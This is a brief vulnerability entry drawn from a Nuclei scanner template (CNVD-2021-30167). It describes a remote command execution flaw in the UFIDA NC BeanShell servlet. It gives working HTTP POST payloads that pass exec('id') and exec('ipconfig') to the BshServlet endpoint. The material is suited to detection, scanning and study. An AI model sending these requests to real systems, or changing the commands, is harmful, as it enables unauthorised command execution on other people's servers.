# Vulnerability: UFIDA NC BeanShell Remote Command Execution
**Classification:** CWE-77
**Source:** Nuclei Template (`CNVD-2021-30167.yaml`)

## Description
UFIDA NC BeanShell contains a remote command execution vulnerability in the bsh.servlet.BshServlet program.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

bsh.script=exec("id");

POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

bsh.script=exec("ipconfig");
```
